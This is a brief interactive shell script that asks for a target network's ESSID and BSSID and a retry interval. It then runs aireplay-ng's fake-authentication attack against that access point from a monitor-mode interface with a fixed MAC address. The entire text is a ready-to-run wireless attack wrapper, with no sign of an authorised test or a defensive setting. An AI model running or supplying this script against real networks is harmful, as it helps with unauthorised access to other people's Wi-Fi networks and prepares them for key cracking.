echo Enter time between attemps, in seconds
read seconds

echo Enter target's essid
read essid

echo Enter target's bssid
read bssid 

aireplay-ng -1 $seconds -o 1 -e $essid -a $bssid -h 00:c0:ca:6c:9c:0c mon0 --ignore-negative-one
